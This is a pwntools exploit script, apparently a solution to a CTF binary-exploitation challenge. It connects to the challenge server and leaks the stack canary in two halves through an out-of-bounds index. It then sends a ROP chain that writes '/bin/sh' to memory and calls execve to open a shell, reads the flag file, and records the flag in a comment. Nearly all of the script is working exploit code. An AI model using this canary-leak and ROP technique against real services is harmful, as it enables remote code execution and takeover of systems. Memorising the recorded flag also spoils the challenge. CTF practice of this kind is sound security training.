from pwn import *
context.arch="amd64"
e=ELF("./chal")
#io=process(e.path)
io=remote("cha-thjcc.scint.org", 10101)

syscall=0x0000000000401364
pop_rax=0x0000000000434bbb
pop_rdi=0x0000000000494253
pop_rsi=0x000000000041fcf5
pop_rdx=0x000000000048a8dc #pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret

io.recvuntil(b"What is my favorite anime > ")
io.sendline(b"Darling in the FRANXX")

main_canary=0x7fffffffe108
input_array=0x7fffffffe07c
idx=(main_canary - input_array)//4
success("Target offset: %d" % idx)

canary=int()

io.recvuntil(b"Select login user > ")
io.sendline(str(idx).encode())
leak=io.recvline().strip().decode().split(" ")[1]
leak=int(leak, 16)<<32 & 0xffffffff00000000
canary+=leak

io.recvuntil(b"Enter login passcode >")
io.sendline(str(idx-1).encode())
leak=io.recvline().strip().decode().split(" ")[1]
leak=int(leak, 16) & 0xffffffff
canary+=leak
success("canary : %s" % hex(canary))

io.recvuntil("Write a 1000-word experience about Darling in the FRANXX >")

buf=e.bss()+0x50 #RW buffer
payload=p64(canary)*8
payload+=flat(0, #rbp
              pop_rdx, 0, 0, 0, 0, 0,
              pop_rsi, buf,
              pop_rax, b"/bin/sh\0",
              0x433f95, #mov qword ptr [rsi], rax ; ret
              pop_rsi, 0,
              pop_rdi, buf,
              pop_rax, 59,
              syscall)

#pause()
io.sendline(payload)

io.sendline("cat /home/chal/flag.txt")
io.interactive()
#THJCC{d4rl1n9_1N_7hE_FR4nXx_15_7he-Be57}
